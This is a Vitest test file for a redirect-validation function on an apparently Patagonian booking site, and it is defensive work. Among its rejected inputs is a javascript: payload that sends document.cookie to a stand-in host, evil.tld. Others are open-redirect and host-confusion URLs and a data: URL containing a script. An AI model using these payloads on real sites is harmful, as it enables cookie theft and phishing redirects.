import { describe, it, expect } from 'vitest'
import { destinoSeguro } from '@/lib/domain/destino-seguro'

const SITIO = 'https://blancapatagonia.com'

describe('destinoSeguro · la vuelta de un pago no sale del sitio', () => {
  it('acepta rutas del propio sitio y URLs del mismo origen', () => {
    expect(destinoSeguro('/reservar/confirmacion/abc?idioma=en', SITIO)).toBe(
      '/reservar/confirmacion/abc?idioma=en',
    )
    expect(destinoSeguro('https://blancapatagonia.com/reservar/confirmacion/abc', SITIO)).toBe(
      'https://blancapatagonia.com/reservar/confirmacion/abc',
    )
  })

  it('rechaza javascript:, otros sitios y las rutas que el navegador lee como otro host', () => {
    expect(destinoSeguro("javascript:fetch('//evil.tld/?c='+document.cookie)", SITIO)).toBe('/')
    expect(destinoSeguro('https://evil.tld/reingresa-tu-tarjeta', SITIO)).toBe('/')
    expect(destinoSeguro('https://blancapatagonia.com.evil.tld/x', SITIO)).toBe('/')
    expect(destinoSeguro('//evil.tld/x', SITIO)).toBe('/')
    expect(destinoSeguro('/\\evil.tld/x', SITIO)).toBe('/')
    expect(destinoSeguro('data:text/html,<script>alert(1)</script>', SITIO)).toBe('/')
  })

  it('sin destino, al inicio', () => {
    expect(destinoSeguro(undefined, SITIO)).toBe('/')
    expect(destinoSeguro('   ', SITIO)).toBe('/')
  })
})
